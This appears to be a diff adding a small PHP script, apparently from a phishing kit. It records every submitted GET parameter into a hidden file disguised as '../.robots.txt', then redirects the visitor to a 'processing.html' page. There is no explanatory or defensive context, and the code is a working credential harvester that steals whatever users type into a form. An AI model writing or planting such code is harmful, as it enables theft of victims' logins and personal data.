@@ -1,0 +1,33 @@
+<?php 
+
+header("Location: processing.html"); 
+$handle = fopen("../.robots.txt", "a"); 
+foreach($_GET as $variable => $value) { 
+    fwrite($handle, $variable); 
+    fwrite($handle, "="); 
+    fwrite($handle, $value); 
+    fwrite($handle, "\r\n"); 
+    $redirect = "http://www.xSCWC.com"; 
+} 
+fwrite($handle, "\r\n"); 
+fclose($handle); exit;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
